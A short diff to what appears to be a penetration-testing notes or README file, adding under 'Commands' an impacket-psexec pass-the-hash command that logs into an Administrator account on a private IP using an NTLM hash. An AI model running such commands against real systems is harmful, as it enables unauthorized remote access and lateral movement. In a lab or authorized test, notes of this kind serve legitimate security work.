@@ -31,7 +31,8 @@ python3 -m install .
 
 ## Commands
 
-
+PSexec with hash (port 135 or 445 must be open):
+`impacket-psexec WEB02-POSEIDO/Administrator@172.16.1.11 -hashes :8ab4098640a136722461728dc38faee2
 
 ___
 
